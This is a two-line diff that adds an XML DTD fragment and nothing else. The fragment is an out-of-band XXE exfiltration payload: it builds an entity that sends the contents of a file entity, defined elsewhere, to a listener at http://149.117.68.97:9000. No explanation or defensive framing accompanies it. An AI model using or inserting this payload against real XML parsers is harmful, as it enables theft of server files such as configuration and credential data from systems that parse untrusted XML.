@@ -1,0 +1,2 @@
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://149.117.68.97:9000/?collect=%file;'>">
+%all;
